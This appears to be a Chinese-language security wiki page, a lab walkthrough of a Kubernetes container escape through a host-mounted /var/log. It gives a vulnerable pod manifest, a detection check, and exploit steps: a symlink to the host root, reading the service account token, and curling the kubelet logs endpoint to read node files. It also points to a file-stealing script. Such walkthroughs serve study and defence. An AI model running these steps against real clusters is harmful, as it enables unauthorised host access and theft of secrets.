---
title: k8s 下挂载 /var/log 逃逸

---

<center><h1>k8s 下挂载 /var/log 逃逸</h1></center>

---

## 0x00 前言

这里用单纯的挂载/var/log 来形容这个逃逸的触发条件其实不太严谨，需要满足如下条件。

- 挂载了/var/log
- 容器是在一个 k8s 的环境中
- 当前 pod 的 serviceaccount 拥有 get|list|watch log 的权限

## 0x01 环境搭建

```bash
git clone https://github.com/Metarget/metarget.git
cd metarget/
pip3 install -r requirements.txt
./metarget gadget install k8s --version 1.16.5
./metarget cnv install mount-var-log
```

或者在 k8s 中执行以下配置文件

```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: logger
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: user-log-reader
rules:
- apiGroups: [""]
  resources:
  - nodes/log
  verbs: ["get", "list", "watch"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: user-log-reader
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: user-log-reader
subjects:
- kind: ServiceAccount
  name: logger
  namespace: default
---
apiVersion: v1
kind: Pod
metadata:
  name: escaper
spec:
  serviceAccountName: logger
  containers:
  - name: escaper
    image: danielsagi/kube-pod-escape
    volumeMounts:
    - name: logs
      mountPath: /var/log/host
  volumes:
  - name: logs
    hostPath:
      path: /var/log/
      type: Directory
```

## 0x02 漏洞检测

前提是处于 k8s 环境下，漏洞检测才有意义

```bash
find / -name lastlog 2>/dev/null | wc -l | grep -q 3 && echo "/var/log is mounted." || echo "/var/log is not mounted."
```

## 0x03 漏洞复现

进入容器

```bash
kubectl exec --stdin --tty escaper -- /bin/bash
```

这里的 /var/log 目标挂载到了 /var/log/host 下，创建软链接

```bash
cd /var/log/host
ln -s / ./root_link
```

这时就可以访问到 node 节点上的文件了

```bash
token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k https://172.17.0.1:10250/logs/root_link/ -H "Authorization: Bearer $token"
```

   <br>

<img width="1000" src="/img/1650013099.png"></br>

或者直接使用脚本，一键窃取敏感文件 https://github.com/danielsagi/kube-pod-escape

   <br>

<img width="1000" src="/img/1650013123.png"></br>

<Vssue />

<script>
export default {
    mounted () {
      this.$page.lastUpdated = "2022年4月15日"
    }
  }
</script>